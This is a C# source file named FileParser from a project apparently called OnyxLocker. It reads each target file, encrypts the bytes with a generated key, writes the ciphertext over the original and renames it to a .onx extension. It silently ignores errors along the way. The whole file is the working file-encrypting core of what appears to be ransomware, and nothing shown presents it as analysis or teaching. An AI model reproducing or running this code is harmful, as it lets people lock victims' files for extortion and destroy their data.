using System;
using System.IO;

namespace OnyxLocker
{
    internal class FileParser : IFileParser
    {
        private IEncryptionProvider EncryptionProvider;
        private byte[] KeyBytes;

        /// <summary>
        /// Provides functions to Encrypt the user's files
        /// </summary>
        /// <param name="encryptionProvider"></param>
        public FileParser(IEncryptionProvider encryptionProvider)
        {
            EncryptionProvider = encryptionProvider;
            KeyBytes = EncryptionProvider.CreateEncryptionKey();
        }

        /// <summary>
        /// Encrypts the files and renames it to a .onx file
        /// </summary>
        /// <param name="filePath">FilePath for the files to encrypt</param>
        public void ParseFile(string filePath)
        {
            var fileBytes = GetFileBytes(filePath);
            var encryptedFileBytes = EncryptionProvider.EncryptBytes(fileBytes, KeyBytes);
            WriteFileBytes(filePath, encryptedFileBytes);

            var fileExtension = Path.GetExtension(filePath);
            var newFilePath = filePath.Replace(fileExtension, ".onx");

            try
            {
                File.Move(filePath, newFilePath);
            }
            catch
            {
            }

            GC.Collect();
        }

        /// <summary>
        /// Reads the file in a bytearray
        /// </summary>
        /// <param name="filePath"></param>
        /// <returns></returns>
        private byte[] GetFileBytes(string filePath)
        {
            using (var fileStream = File.OpenRead(filePath))
            {
                var fileBytes = new byte[fileStream.Length];
                try
                {
                    fileStream.Read(fileBytes, 0, Convert.ToInt32(fileStream.Length));
                    fileStream.Close();

                    return fileBytes;
                }
                finally
                {
                    fileStream.Close();
                }
            }
        }

        /// <summary>
        /// Writes the filebytes to the given path
        /// </summary>
        /// <param name="filePath"></param>
        /// <param name="fileBytes"></param>
        private void WriteFileBytes(string filePath, byte[] fileBytes)
        {
            using (var fileStream = File.OpenWrite(filePath))
            {
                if (fileStream.CanWrite)
                {
                    fileStream.Write(fileBytes, 0, Convert.ToInt32(fileBytes.Length));
                }
            }
        }
    }
}